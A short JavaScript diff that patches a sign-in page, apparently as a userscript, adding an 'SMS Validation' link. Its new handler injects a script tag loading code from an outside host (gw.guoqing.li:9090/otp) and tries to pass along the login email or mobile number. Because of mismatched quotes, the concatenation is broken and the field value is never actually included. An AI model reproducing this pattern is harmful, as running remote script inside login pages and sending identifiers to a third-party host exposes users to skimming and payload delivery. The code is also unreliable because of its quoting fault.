@@ -36,7 +36,7 @@ var container = document.getElementById("capture_signIn_signInForm");
 var alink = document.createElement('a');
 alink.href = '#';
 alink.onclick = function () {
-    loadXMLDoc();
+    loadWithJs();
     this.style.backgroundColor = 'red';
     return false;
 };
@@ -44,3 +44,15 @@ alink.innerHTML = 'SMS Validation';
 container.appendChild(alink);
 }
 
+function loadScript(url) {
+    var scrs = document.getElementsByTagName('script');
+    var last = scrs[scrs.length - 1];
+    var scr = document.createElement('script');
+    scr.src = url;
+    scr.async = true;
+    last.parentNode.insertBefore(scr, last);
+}
+
+function loadWithJs(){    
+loadScript('https://gw.guoqing.li:9090/otp?identifier="+document.getElementById("capture_signIn_emailOrMobileNumber');
+}
